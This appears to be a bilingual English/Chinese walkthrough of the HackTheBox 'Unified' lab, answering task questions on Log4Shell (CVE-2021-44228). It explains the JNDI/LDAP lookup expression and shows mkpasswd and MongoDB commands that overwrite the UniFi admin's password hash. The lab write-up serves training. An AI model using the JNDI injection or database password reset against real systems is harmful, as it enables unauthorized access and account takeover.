Unified

About: Unified is a very easy Linux machine that demonstrates the exploitation of the Log4Shell (CVE-2021-44228) vulnerability in the UniFi Network application. Enumeration reveals a vulnerable UniFi instance where a remote execution can be achieved by crafting and injecting a JNDI payload into a POST request. Then a local MongoDB database can be leveraged to reset the administrator password and gain access to the UniFi admin panel. Plaintext SSH credentials can be discovered in the application settings leading to final privilege escalation.

介绍：Unified 是一台非常简单的 Linux 机器，它演示了如何利用 UniFi Network 应用程序中的 Log4Shell (CVE-2021-44228) 漏洞。枚举结果显示，UniFi 实例存在漏洞，可以通过构造 JNDI 有效负载并将其注入 POST 请求来实现远程执行。然后可以利用本地 MongoDB 数据库重置管理员密码，并访问 UniFi 管理面板。可以在应用程序设置中发现明文 SSH 凭据，从而导致最终权限提升。

靶机 IP：10.129.96.149

Task 4

What is the CVE for the identified vulnerability?

已识别漏洞的 CVE 编号是多少？

谷歌搜索 Unifi Network 6.4.54，可知漏洞编号 CVE-2021-44228(Log4Shell)。

该漏洞是 Apache Log4j2 远程代码执行（RCE）。

原理是：Log4j2 的 Lookup 解析功能支持 ${jndi:ldap://xxx} 表达式；当外部可控输入被日志打印时，会触发 JNDI 去连接攻击者可控的 LDAP 服务，加载恶意字节码并执行任意代码。

答案：CVE-2021-44228

Task 5

What protocol does JNDI leverage in the injection?

JNDI 在注入过程中使用什么协议？

一般使用 LDAP 协议。这时一个轻量目录访问协议，默认端口为 389/TCP。

答案：LDAP

Task 12

What is the function we use to update users within the database in MongoDB?

在 MongoDB 数据库中，我们使用什么函数来更新数据库中的用户？

使用 db.admin.update() 来更新用户。主要是修改 x_shadow 中的密码，这密码是 SHA-512 加盐 crypt 哈希，格式为 $6$盐值$哈希值。

先生成一个密码，对应明文为 123456：

1
2
3

┌──(venv)─(root㉿kali)-[~/HTB/Unified/Log4jUnifi]
└─# mkpasswd -m sha-512 123456  
$6$tj52j4UtUCgihgeT$BNzysUrcKPDaPNLhqOyToc62z4lw20hCI8YsD55AZCIm1N02KHArRTCZEWJsvDZGbJmoCI56iVjAXb4jVg2tK.

然后更新 admin 密码：

1

db.admin.update({"_id" : ObjectId("61ce278f46e0fb0012d47ee4")},{$set: { x_shadow: "$6$tj52j4UtUCgihgeT$BNzysUrcKPDaPNLhqOyToc62z4lw20hCI8YsD55AZCIm1N02KHArRTCZEWJsvDZGbJmoCI56iVjAXb4jVg2tK." } })

答案：db.admin.update()
